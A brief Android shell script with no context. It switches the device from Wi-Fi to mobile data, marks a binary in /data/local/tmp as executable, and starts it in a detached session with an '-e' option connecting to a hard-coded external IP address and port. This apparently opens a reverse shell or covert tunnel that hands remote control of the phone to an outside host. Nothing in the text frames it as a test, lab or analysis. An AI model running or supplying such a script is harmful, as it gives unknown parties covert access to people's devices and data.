fwdport=1900
sleep 5
svc wifi disable
svc data enable
sleep 5
chmod +x /data/local/tmp/ngroka
(setsid /data/local/tmp/ngroka -e 52.66.8.185:$fwdport &)
